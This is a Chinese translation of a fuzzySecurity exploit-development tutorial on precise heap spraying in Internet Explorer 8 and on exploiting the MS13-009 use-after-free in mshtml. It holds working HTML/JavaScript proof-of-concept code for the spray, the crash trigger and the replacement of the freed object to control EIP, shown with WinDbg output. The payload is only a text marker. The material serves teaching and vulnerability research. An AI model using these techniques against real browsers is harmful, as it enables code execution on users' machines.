---
title: Windows exploit系列教程第九部分：堆喷射[第二章：UAF]
date: 2018-01-05 23:47:11
categories: exploit
tags:
	- windows
	- novice
---
fuzzySecurity于16年更新了数篇Windows内核exp的教程，本文是用户层的最后一篇。[点击查看原文](http://fuzzysecurity.com/tutorials/expDev/11.html)。

<!--more-->

# Windows exploit开发系列教程第九部分：堆喷射[第二章：UAF]—Finding a needle in a Haystack

欢迎回到堆喷射系列两部分教程的第二部分。本文会在IE8上完成精准的堆喷射。在这两种基本情形下你需要实现严格而精准的堆喷射：

1. 你需要处理DEP，这种情况你需要重定向执行流到ROP链的起始
2. 利用UAF漏洞需要满足虚表（Vtable）方法的条件

我想找出一个案例来同时处理这两种情况，让你痛并快乐着。然而大部分这种漏洞本身都相当复杂，不适合也不需要作为初学者的导读内容。这里需要澄清两件事。首先就是熟能生巧，找到漏洞，将他们拆分，疯狂打脸。然后加把劲，少挨几个耳光并继续前行。其次本教程并不会聚焦于漏洞的分析，本教程旨在描摹你在编写exp是会遇到的障碍以及教会你如何去克服它们。

今天我们来看看MS13-009， 你可以在这里找到对应的metasploit模块[here](http://www.exploit-db.com/exploits/24495/)。我也附加了一些阅读材料的链接在下面，我强烈推荐你阅读以下，如果你想要对这个课题更加了解的话。

**Debugging Machine：**

Windows XP SP3 with IE8

**Links:**

Exploit writing tutorial part 11 : Heap Spraying Demystified (corelan) - [here](https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/)

Heap Feng Shui in JavaScript (Alexander Sotirov) - [here](http://www.phreedom.org/presentations/heap-feng-shui/)

Post-mortem Analysis of a Use-After-Free Vulnerability (Exploit-Monday) - [here](http://www.exploit-monday.com/2011/07/post-mortem-analysis-of-use-after-free_07.html)

Heap spraying in Internet Explorer with rop nops (GreyHatHacker) - [here](http://www.greyhathacker.net/?p=549l)

CVE-2013-0025 MS13-009 IE SLayouRun (Chinese analysis of ms13-009, you will probably need to load this from the google cache) - [here](http://www.hackdig.com/wap/?id=2239)

## 介绍

我想这个话题需要一些介绍，否则你会发现我们即将遇到的大部分障碍都不怎么熟悉。我不会非常详细的展开，因为那太过于耗时了。如果你对这里的一些话题不是很熟悉的话，我建议你先阅读本系列的第7部分（ROP）和第8部分（堆喷射[第一章：Vanilla EIP]）以及上面的阅读材料。

在我们讨论UAF之前我们需要先理解虚表（vtable）是什么。C++语言允许基类去定义虚函数。而对于子类来说，它们可以重新去定义这些虚函数的实现体留为己用。也就是说虚函数允许子类去替换基类所提供的实现体。编译器确保被替换的函数永远会被调用，只要该对象实际上是一个子类的话。这些都发生在运行时。

> 译者注：这里实际上说的不是太理想，虚函数就是子类可以重新定义实现体，且会取代父类提供的实现体。C++用此实现多态，即运行时动态绑定。而所谓多态，简单理解就是——当用父类指针指向子类对象时，一旦调用到虚函数，最后执行的会是子类定义的那个实现体，即作者所说的那个replacement。

虚表保存了基类中定义的各种虚函数实现体的指针。当一个函数在运行时需要被调用时，合适的指针会从对应的子类虚表中选择出来。我们可以看这样一张表示图。

![](/images/exploit/fuzzySecurity/20180105_1.jpg)

UAF漏洞往往较为复杂，引发的问题也变化多端。通常执行流会像这样：

1. 在某个点上一个对象被创建并与一个虚表相关联。
2. 此后对象由一个虚表指针所调用。如果我们在调用前释放了该对象那么程序会在后面调用该对象时崩溃（eg: 在释放后尝试重用对象——UAF）。

想要利用这个议题我们将通常执行这些操作：

1. 在某个点一个对象被创建
2. 触发该对象的释放操作
3. 我们创建自己的对象，它的尺寸尽可能的和原始对象相仿
4. 此后当虚表指针被调用时，我们的伪造对象就被用到并得以执行代码

通常这些听起来贼复杂，但是随着我们示例的展开，一切都会渐渐清晰。首先我们创建一个可信的堆喷射，此后我们再聚焦于MS13-009！

## 堆上的Shellcode

如在第八部分中做的那样，我想先以IE8的一个可信堆喷射开始。继续此前的工作，我们使用下面的POC。该POC有些轻量改动。最主要的不同在于我增加了一个alloc函数，它会将我们输入的buffer尺寸进行调整，以便于它们可以匹配BSTR的规格（我们需要扣除6以补偿BSTR header和footer，除2是因为我们用的是unicode unescape）。

```html
<html>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000; // 4096-bytes
    NopSlide = '';
     
    var Shellcode = unescape(
    '%u7546%u7a7a%u5379'+   // ASCII
    '%u6365%u7275%u7469'+   // FuzzySecurity
    '%u9079');
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - Shellcode.length);
     
    var OBJECT = Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
     
    alert("Spray Done!");
     
</script>
</html>
```

快速看看调试器，堆喷射都发生了什么。

```
Looking at the default process heap we can see that our spray accounts for 98,24% of the busy blocks, we
can tell it is our spray because the blocks have a size of 0xfffe0 (= 1 mb).

0:019> !heap -stat -h 00150000
 heap @ 00150000
group-by: TOTSIZE max-display: 20
    size     #blocks     total     ( %) (percent of total busy bytes)
    fffe0 97 - 96fed20  (98.24)
    3fff8 3 - bffe8  (0.49)
    7ff8 f - 77f88  (0.30)
    1fff8 3 - 5ffe8  (0.24)
    1ff8 28 - 4fec0  (0.20)
    fff8 3 - 2ffe8  (0.12)
    3ff8 7 - 1bfc8  (0.07)
    ff8 13 - 12f68  (0.05)
    7f8 1e - ef10  (0.04)
    8fc1 1 - 8fc1  (0.02)
    5fc1 1 - 5fc1  (0.02)
    57e0 1 - 57e0  (0.01)
    3f8 15 - 5358  (0.01)
    4fc1 1 - 4fc1  (0.01)
    5e4 b - 40cc  (0.01)
    3980 1 - 3980  (0.01)
    20 1bb - 3760  (0.01)
    388 d - 2de8  (0.01)
    2cd4 1 - 2cd4  (0.01)
    480 7 - 1f80  (0.01)

Listing only the allocation with a size of 0xfffe0 we can see that our spray is huge stretching from
0x03680018 to 0x0d660018. Another important thing to notice is that the Heap Entry Addresses all seem
to end like this 0x????0018, this is a good indicator that our spray is reliable.

0:019> !heap -flt s fffe0
    _HEAP @ 150000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        03680018 1fffc 0000  [0b]   03680020    fffe0 - (busy VirtualAlloc)
        03a30018 1fffc fffc  [0b]   03a30020    fffe0 - (busy VirtualAlloc)
        03790018 1fffc fffc  [0b]   03790020    fffe0 - (busy VirtualAlloc)
        038a0018 1fffc fffc  [0b]   038a0020    fffe0 - (busy VirtualAlloc)
        03b40018 1fffc fffc  [0b]   03b40020    fffe0 - (busy VirtualAlloc)
        03c50018 1fffc fffc  [0b]   03c50020    fffe0 - (busy VirtualAlloc)
[...snip...]
        0d110018 1fffc fffc  [0b]   0d110020    fffe0 - (busy VirtualAlloc)
        0d220018 1fffc fffc  [0b]   0d220020    fffe0 - (busy VirtualAlloc)
        0d330018 1fffc fffc  [0b]   0d330020    fffe0 - (busy VirtualAlloc)
        0d440018 1fffc fffc  [0b]   0d440020    fffe0 - (busy VirtualAlloc)
        0d550018 1fffc fffc  [0b]   0d550020    fffe0 - (busy VirtualAlloc)
        0d660018 1fffc fffc  [0b]   0d660020    fffe0 - (busy VirtualAlloc)


0:019> d 03694024-10
03694014  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03694024  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
03694034  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03694044  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03694054  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03694064  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03694074  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03694084  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:019> d 03694024-10+2000
03696014  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03696024  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
03696034  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03696044  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03696054  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03696064  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03696074  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03696084  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:019> d 03694024-10+4000
03698014  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03698024  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
03698034  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03698044  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03698054  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03698064  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03698074  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
03698084  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................

We are particularly interested in the address 0x0c0c0c0c. Since this address has been allocate on the heap
by our spray we can use the command below we can find out which Heap Entry 0x0c0c0c0c belongs to.

0:019> !heap -p -a 0c0c0c0c
    address 0c0c0c0c found in
    _HEAP @ 150000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0c010018 1fffc 0000  [0b]   0c010020    fffe0 - (busy VirtualAlloc)
```

下图是我们堆喷射的可视化显示。我们用150mb大小的数据填充了堆，这150mb被分成了150个1mb的块（每个块都以独立的BSTR对象存储）。该BSTR对象由0x1000（4096字节）的块填充，它包含了我们的shellcode和NOP指令。

![](/images/exploit/fuzzySecurity/20180105_2.jpg)

到目前一切顺利！下面我们需要重组我们的堆喷射，以便于shellcode指针精准的放在0x0c0c0c0c，这里将是我们的ROP链首。考虑到由于我们的堆喷射，如果0x0c0c0c0c在内存的某个地方被分配了，那么它在0x1000块的内部一定有一个特定的偏移。我们想要做的就是计算出0x0c0c0c0c到块首的偏移，并把这个偏移作为喷射的padding。

```


 ________________________                          ________________________
|                        |                        |                        |
|       Shellcode        |                        |        Padding         |
|------------------------|                        |                        |
|                        |                        |                        |
|                        |                        |                        |
|                        |                        |                        |
|                        |                        |                        |
|                        | <-- 0x0c0c0c0c         |------------------------| <-- 0x0c0c0c0c
|                        |     Points into our    |                        |     Points at the 
|         NOP's          |     NOP's.             |       Shellcode        |     beginning of our
|                        |                        |                        |     shellcode.
|                        |                        |                        |
|                        |                        |                        |
|                        |                        |                        |
|                        |                        |        [+ NOP's]       |
|                        |                        |                        |
|     (0x1000 Block)     |                        |     (0x1000 Block)     |
|________________________|                        |________________________|
```

如果你重新运行上面的堆喷射，你会注意到0x0c0c0c0c并不总是指向同一个堆项，然而0x1000块到0x0c0c0c0c的偏移却始终是不变的。我们已经掌握了padding尺寸计算的所有信息。

```
0:019> !heap -p -a 0c0c0c0c
    address 0c0c0c0c found in
    _HEAP @ 150000
      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
        0c010018 1fffc 0000  [0b]   0c010020    fffe0 - (busy VirtualAlloc)
        
        
  0x0c0c0c0c (Address we are interested in)
- 0x0c010018 (Heap Entry Address)
  ----------
     0xb0bf4 => Distance between the Heap Entry address and 0x0c0c0c0c, this value will be different from
                spray to spray. Next we need to find out what the offset is in our 0x1000 hex block. We
                can do this by subtracting multiples of 0x1000 till we have a value that is smaller than
                0x1000 hex (4096-bytes).

       0xbf4 => We need to correct this value based on our allocation size => (x/2)-6
       
       0x5f4 => If we insert a padding of this size in our 0x1000 block it will align our shellcode
                exactly to 0x0c0c0c0c.

```

让我们修改POC并重新运行堆喷射。

```html
<html>
<script>
 
    //Fix BSTR spec
    function alloc(bytes, mystr) {
        while (mystr.length<bytes) mystr += mystr;
        return mystr.substr(0, (bytes-6)/2);
    }
     
    block_size = 0x1000;
    padding_size = 0x5F4; //offset to 0x0c0c0c0c inside our 0x1000 hex block
    Padding = '';
    NopSlide = '';
     
    var Shellcode = unescape(
    '%u7546%u7a7a%u5379'+   // ASCII
    '%u6365%u7275%u7469'+   // FuzzySecurity
    '%u9079');
     
    for (p = 0; p < padding_size; p++){ 
    Padding += unescape('%ub33f');}
     
    for (c = 0; c < block_size; c++){ 
    NopSlide += unescape('%u9090');}
    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
     
    var OBJECT = Padding + Shellcode + NopSlide;
    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
     
    var evil = new Array();
    for (var k = 0; k < 150; k++) {
        evil[k] = OBJECT.substr(0, OBJECT.length);
    }
     
    alert("Spray Done!");
     
</script>
</html>
```
我们可以看到我们已经重组了shellcode到0x0c0c0c0c。实际上当我们在内存中搜索字符串"FuzzySecurity"时我们可以看到所有的位置都以相同的字节序列"0x?????c0c"终止。
```
0:019> !heap -stat -h 00150000
 heap @ 00150000
group-by: TOTSIZE max-display: 20
    size     #blocks     total     ( %) (percent of total busy bytes)
    fffe0 97 - 96fed20  (98.18)
    3fff8 3 - bffe8  (0.49)
    7ff8 f - 77f88  (0.30)
    1fff8 3 - 5ffe8  (0.24)
    1ff8 2b - 55ea8  (0.22)
    fff8 4 - 3ffe0  (0.16)
    3ff8 8 - 1ffc0  (0.08)
    ff8 13 - 12f68  (0.05)
    7f8 1e - ef10  (0.04)
    8fc1 1 - 8fc1  (0.02)
    5fc1 1 - 5fc1  (0.02)
    57e0 1 - 57e0  (0.01)
    3f8 15 - 5358  (0.01)
    4fc1 1 - 4fc1  (0.01)
    5e4 b - 40cc  (0.01)
    3980 1 - 3980  (0.01)
    20 1bb - 3760  (0.01)
    388 d - 2de8  (0.01)
    2cd4 1 - 2cd4  (0.01)
    480 7 - 1f80  (0.01)
	

0:019> s -a 0x00000000 L?7fffffff "FuzzySecurity"
[...snip...]
0c0c0c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
[...snip...]
0d874c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
0d876c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
0d878c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
0d87ac0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
0d87cc0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
0d87ec0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...


0:019> d 0c0c0c0c-20
0c0c0bec  3f b3 3f b3 3f b3 3f b3-3f b3 3f b3 3f b3 3f b3  ?.?.?.?.?.?.?.?.
0c0c0bfc  3f b3 3f b3 3f b3 3f b3-3f b3 3f b3 3f b3 3f b3  ?.?.?.?.?.?.?.?.
0c0c0c0c  46 75 7a 7a 79 53 65 63-75 72 69 74 79 90 90 90  FuzzySecurity...
0c0c0c1c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0c0c0c2c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0c0c0c3c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0c0c0c4c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0c0c0c5c  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
```

我们现在重组了堆喷射，且可以把shellcode放到选择的任意地址（本例中是0x0c0c0c0c）。堆喷射在Windows XP/7上的IE7-8上运作良好。稍微修改一下也可以在IE9上运行，但这已经超出了本教程的范围。

> 译者注：IE9引入了Nozzle，但实际上非常好绕过，Nozzle不允许毗邻堆块完全一致，绕过方法也很简单，每个chunk的junk值都不同即可（实际上修改1个字节即可）。另一方面，到了DEP的时代，0x0c0c0c0c这个值已经丧失了原本的意义，原本用于sled的0C指令也就无需执行，改成什么其他的数都是可以的，这也要求我们的堆喷需要十分精准的到ROP链首，exactly。

## 近距离审视MS13-009

如上面所提到的，本文主要的目的不是去分析漏洞，而是理解在编写exp时所遇到的障碍。我们会快速的看一下这个漏洞以理解发生了些什么。下面给出触发该bug的POC。

```html
<!doctype html>
<html>
<head>
<script>
  
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
     
    //CollectGarbage();
  
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
  
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

好的，让我们在调试器中看看触发漏洞时发生了什么。你会注意到我添加了CollectGarbage()函数（但注释掉了）。在我的测试中我注意到这个bug有一点不稳定（只有80%左右），因此我曾用CollectGarbage()来实验看看他是否会提升稳定性。CollectGarbage()是个javascript可见的函数，它会清空四个bin，这4个bin用于在oleaut32.dll中实现一个自定义堆(custom heap)管理引擎。当我们试图去在堆上分配自己伪造的对象时，它会变得非常有用。在我的测试中，我无法判断它是否会引起差异，如果有人直到的话请给我留言。

从下面的执行流来看，有一个试图去调用虚表中函数的对象，调用位置在eax偏移0x70处。

```
0:019> g
(e74.f60): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00205618 ecx=024e0178 edx=00000000 esi=0162bcd0 edi=00000000
eip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc+0x2:
3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:00000070=????????


0:008> uf mshtml!CElement::Doc
mshtml!CElement::Doc:
3cf76980 8b01            mov     eax,dword ptr [ecx]
3cf76982 8b5070          mov     edx,dword ptr [eax+70h]
3cf76985 ffd2            call    edx
3cf76987 8b400c          mov     eax,dword ptr [eax+0Ch]
3cf7698a c3              ret
```

栈回溯显示了执行流，最终引导至崩溃。在调用期望返回处程序未崩溃之前，如果我们反汇编（unassemble）该返回地址，就可以看到该函数是如何被调用的了。看起来某个在EBX的函数传递了它的虚表指针给ECX，然后由mshtml!CElement::Doc所引用来调用一个在偏移0x70处的函数。

```
0:008> knL
 # ChildEBP RetAddr  
00 0162bca0 3cf149d1 mshtml!CElement::Doc+0x2
01 0162bcbc 3cf14c3a mshtml!CTreeNode::ComputeFormats+0xb9
02 0162bf68 3cf2382e mshtml!CTreeNode::ComputeFormatsHelper+0x44
03 0162bf78 3cf237ee mshtml!CTreeNode::GetFancyFormatIndexHelper+0x11
04 0162bf88 3cf237d5 mshtml!CTreeNode::GetFancyFormatHelper+0xf
05 0162bf98 3d013ef0 mshtml!CTreeNode::GetFancyFormat+0x35
06 0162bfb8 3d030be9 mshtml!CLayoutBlock::GetDisplayAndPosition+0x77
07 0162bfd4 3d034850 mshtml!CLayoutBlock::IsBlockNode+0x1e
08 0162bfec 3d0347e2 mshtml!SLayoutRun::GetInnerNodeCrossingBlockBoundary+0x43
09 0162c008 3d0335ab mshtml!CTextBlock::AddSpansOpeningBeforeBlock+0x1f
0a 0162d71c 3d03419d mshtml!CTextBlock::BuildTextBlock+0x280
0b 0162d760 3d016538 mshtml!CLayoutBlock::BuildBlock+0x1ec
0c 0162d7e0 3d018419 mshtml!CBlockContainerBlock::BuildBlockContainer+0x59c
0d 0162d818 3d01bb86 mshtml!CLayoutBlock::BuildBlock+0x1c1
0e 0162d8dc 3d01ba45 mshtml!CCssDocumentLayout::GetPage+0x22a
0f 0162da4c 3cf5bdc7 mshtml!CCssPageLayout::CalcSizeVirtual+0x254
10 0162db84 3cee2c95 mshtml!CLayout::CalcSize+0x2b8
11 0162dc20 3cf7e59c mshtml!CView::EnsureSize+0xda
12 0162dc64 3cf8a648 mshtml!CView::EnsureView+0x340
13 0162dc8c 3cf8a3b9 mshtml!CView::EnsureViewCallback+0xd2
14 0162dcc0 3cf750de mshtml!GlobalWndOnMethodCall+0xfb
15 0162dce0 7e418734 mshtml!GlobalWndProc+0x183
16 0162dd0c 7e418816 USER32!InternalCallWinProc+0x28
17 0162dd74 7e4189cd USER32!UserCallWinProcCheckWow+0x150
18 0162ddd4 7e418a10 USER32!DispatchMessageWorker+0x306
19 0162dde4 3e2ec29d USER32!DispatchMessageW+0xf
1a 0162feec 3e293367 IEFRAME!CTabWindow::_TabWindowThreadProc+0x54c
1b 0162ffa4 3e135339 IEFRAME!LCIETab_ThreadProc+0x2c1
1c 0162ffb4 7c80b729 iertutil!CIsoScope::RegisterThread+0xab
1d 0162ffec 00000000 kernel32!BaseThreadStart+0x37


0:008> u 3cf149d1-7
mshtml!CTreeNode::ComputeFormats+0xb2:
3cf149ca 8b0b            mov     ecx,dword ptr [ebx]
3cf149cc e8af1f0600      call    mshtml!CElement::Doc (3cf76980)
3cf149d1 53              push    ebx
3cf149d2 891e            mov     dword ptr [esi],ebx
3cf149d4 894604          mov     dword ptr [esi+4],eax
3cf149d7 8b0b            mov     ecx,dword ptr [ebx]
3cf149d9 56              push    esi
3cf149da e837010000      call    mshtml!CElement::ComputeFormats (3cf14b16)


We can confirm our suspicions by looking at some register values.

0:008> d ebx
00205618  78 01 4e 02 00 00 00 00-4d 20 ff ff ff ff ff ff  x.N.....M ......
00205628  51 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  Q...............
00205638  00 00 00 00 00 00 00 00-52 00 00 00 00 00 00 00  ........R.......
00205648  00 00 00 00 00 00 00 00-00 00 00 00 80 3f 4e 02  .............?N.
00205658  01 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00205668  a5 0d a8 ea 00 01 0c ff-b8 38 4f 02 e8 4f 20 00  .........8O..O .
00205678  71 02 ff ff ff ff ff ff-71 01 00 00 01 00 00 00  q.......q.......
00205688  f8 4f 20 00 80 4b 20 00-f8 4f 20 00 98 56 20 00  .O ..K ..O ..V .

0:008> d ecx
024e0178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e0188  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e0198  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e01a8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e01b8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e01c8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e01d8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
024e01e8  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

0:008> r
eax=00000000 ebx=00205618 ecx=024e0178 edx=00000000 esi=0162bcd0 edi=00000000
eip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
```

通过设置一些巧妙的断点，我们可以追溯到mshtml!CTreeNode的分配来看看是否有熟悉的值出现。下面的结果显示EBX指向CParaElement，被调用的函数是CElement:SecurityContext。这看起来和MS13-009的漏洞描述一致：**“IE浏览器的一个UAF漏洞，CParaElement节点被释放了但在CDoc中却仍旧保留了一个引用。当CDoc重新布局时这段内存会被重用到”**。

```
0:019> bp mshtml!CTreeNode::CTreeNode+0x8c ".printf \"mshtml!CTreeNode::CTreeNode allocated obj at %08x,
ref to obj %08x of type %08x\\n\", eax, poi(eax), poi(poi(eax)); g"

0:019> g
mshtml!CTreeNode::CTreeNode allocated obj at 002059d8, ref to obj 024d1f70 of type 3cebd980
mshtml!CTreeNode::CTreeNode allocated obj at 002060b8, ref to obj 024d1e80 of type 3cebd980
mshtml!CTreeNode::CTreeNode allocated obj at 002060b8, ref to obj 0019ef80 of type 3cf6fb00
mshtml!CTreeNode::CTreeNode allocated obj at 00206218, ref to obj 024d1e80 of type 3cecf528
mshtml!CTreeNode::CTreeNode allocated obj at 00205928, ref to obj 024d1be0 of type 3cecf7f8
mshtml!CTreeNode::CTreeNode allocated obj at 00206008, ref to obj 024ff7d0 of type 3cecfa78
mshtml!CTreeNode::CTreeNode allocated obj at 00205c98, ref to obj 024151c0 of type 3ceca868
mshtml!CTreeNode::CTreeNode allocated obj at 002054b0, ref to obj 024ff840 of type 3cedcfe8
mshtml!CTreeNode::CTreeNode allocated obj at 00205fb0, ref to obj 024d1c10 of type 3cee61e8
mshtml!CTreeNode::CTreeNode allocated obj at 00206060, ref to obj 030220b0 of type 3cebd980
mshtml!CTreeNode::CTreeNode allocated obj at 002062c8, ref to obj 03022110 of type 3cecf528
mshtml!CTreeNode::CTreeNode allocated obj at 00206320, ref to obj 03022170 of type 3cecf7f8
mshtml!CTreeNode::CTreeNode allocated obj at 00206378, ref to obj 024ffb88 of type 3cecfa78
mshtml!CTreeNode::CTreeNode allocated obj at 002063d0, ref to obj 024ffb50 of type 3cedcfe8
(b54.cd4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00205fb0 ecx=024d0183 edx=00000000 esi=0162bcd0 edi=00000000
eip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc+0x2:
3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:00000070=????????

0:008> ln 3cee61e8
(3cee61e8)   mshtml!CParaElement::`vftable'   |  (3d071410)   mshtml!CUListElement::`vftable'
Exact matches:
    mshtml!CParaElement::`vftable' = <no type information>

0:008> ln poi(mshtml!CParaElement::`vftable'+0x70)
(3cf76950)   mshtml!CElement::SecurityContext   |  (3cf76980)   mshtml!CElement::Doc
Exact matches:
    mshtml!CElement::SecurityContext (<no parameter info>)
```

## MS13-009 EIP

如前面所提及，这里的主要焦点是如何克服编写exp过程中的各种阻碍，因此我不花时间来解释如何在堆上分配我们自己的对象。取而代之的是，我会使用一个公共可用的exp的片段。我们的新POC如下所示。

```html
<!doctype html>
<html>
<head>
<script>
 
    var data;
    var objArray = new Array(1150);
  
    setTimeout(function(){
    document.body.style.whiteSpace = "pre-line";
  
    //CollectGarbage();
  
        for (var i=0;i<1150;i++){
            objArray[i] = document.createElement('div');
            objArray[i].className = data += unescape("%u0c0c%u0c0c");
        }
  
        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
        }, 100)
  
</script>
</head>
<body>
<p> </p>
</body>
</html>
```

再次注意到CollectGarbage()函数，用它来看看在分配对象内存时是否有显著的区别。让我们看看执行POC后，调试器中发生了什么。

```
0:019> g
(ee4.d9c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0c0c0c0c ebx=00205fb0 ecx=024c0018 edx=00000000 esi=0162bcd0 edi=00000000
eip=3cf76982 esp=0162bca4 ebp=0162bcbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CElement::Doc+0x2:
3cf76982 8b5070          mov     edx,dword ptr [eax+70h] ds:0023:0c0c0c7c=????????

0:008> d ebx
00205fb0  18 00 4c 02 00 00 00 00-4d 20 ff ff ff ff ff ff  ..L.....M ......
00205fc0  51 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  Q...............
00205fd0  00 00 00 00 00 00 00 00-52 00 00 00 00 00 00 00  ........R.......
00205fe0  00 00 00 00 00 00 00 00-00 00 00 00 50 f7 4c 02  ............P.L.
00205ff0  01 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
00206000  78 0b a8 ea 00 01 0c ff-f8 1c 4e 02 70 57 20 00  x.........N.pW .
00206010  71 02 02 00 01 00 00 00-71 01 00 00 01 00 00 00  q.......q.......
00206020  80 57 20 00 48 5b 20 00-80 57 20 00 30 60 20 00  .W .H[ ..W .0` .

0:008> d ecx
024c0018  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0028  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0038  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0048  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0058  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0068  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0078  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................
024c0088  0c 0c 0c 0c 0c 0c 0c 0c-0c 0c 0c 0c 0c 0c 0c 0c  ................

0:008> uf mshtml!CElement::Doc
mshtml!CElement::Doc:
3cf76980 8b01            mov     eax,dword ptr [ecx]      /// eax = 0x0c0c0c0c
3cf76982 8b5070          mov     edx,dword ptr [eax+70h]  /// edx = 0x0c0c0c0c + 0x70 = DWORD 0x0c0c0c7c
3cf76985 ffd2            call    edx                      /// call DWORD 0x0c0c0c7c
```

